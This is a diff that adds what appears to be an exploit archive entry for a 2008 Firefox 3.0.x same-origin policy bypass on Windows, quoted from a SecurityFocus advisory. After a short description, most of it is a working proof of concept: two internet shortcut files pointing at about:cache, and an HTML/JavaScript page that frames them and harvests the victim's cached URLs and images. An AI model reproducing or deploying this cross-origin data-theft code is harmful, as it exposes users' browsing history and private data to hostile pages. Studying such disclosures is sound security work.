@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/31611/info
+
+Mozilla Firefox is prone to a vulnerability that allows attackers to violate the same-origin policy. This issue occurs because the application fails to properly enforce the same-origin policy when handling internet shortcut files.
+
+An attacker may create a malicious webpage that can access the properties of another domain. This may allow the attacker to obtain sensitive information or launch other attacks against a user of the browser.
+
+Firefox 3.0.1 through 3.0.3 for Microsoft Windows are vulnerable; other versions may also be affected. 
+
+'testurl1.url':
+[InternetShortcut]
+URL=about:cache?device=memory
+IDList=
+[{000214A0-0000-0000-C000-000000000046}]
+Prop3=19,2
+
+'testurl2.url':
+[InternetShortcut]
+URL=about:cache?device=disk
+IDList=
+[{000214A0-0000-0000-C000-000000000046}]
+Prop3=19,2 
+
+
+<script> function a() { s=""; h=""; for(i=0;i<window.frames.length;i++) { d=window.frames[i].document; for(j=0;j<d.links.length;j++) { u=d.links[j].text s+=u+"\n"; h+="<img src=\""+u+"\">"; } } document.getElementById("t").value=s; document.getElementById("x").innerHTML=h; } </script> <a href="javascript:a();">Start Test</a><br> <a href="javascript:window.location=location.href">Load This Page Again</a><br> <br> <br> <b>List of files that you recently fetched from the internet:</b><br> <textarea rows="10" cols="100" id=t wrap=off>&lt;/textarea&gt; <br> <br> <b>List of images that you recently viewed on the internet:</b><br> <div id=x></div> <br> <br> <iframe width=300 height=200 src="testurl1.url"></iframe> <iframe width=300 height=200 src="testurl2.url"></iframe> 
